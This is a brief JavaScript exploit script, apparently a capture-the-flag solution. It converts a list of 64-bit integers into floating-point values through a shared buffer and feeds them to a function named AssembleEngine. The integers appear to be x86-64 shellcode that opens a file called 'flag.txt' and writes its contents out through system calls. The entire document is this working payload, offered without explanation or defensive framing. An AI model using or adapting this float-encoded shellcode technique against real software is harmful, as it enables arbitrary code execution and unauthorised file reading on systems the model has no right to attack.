var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn)
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

payload = [0x66b848240cfe016an, 0x507478742e67616cn, 0xf631e7894858026an, 0x7fffffffba41050fn, 0x016a58286ac68948n, 0x90909090050f995fn]
payload_float = []

for (let i = 0; i < payload.length; i++) {
    payload_float.push(itof(payload[i]))
}

AssembleEngine(payload_float)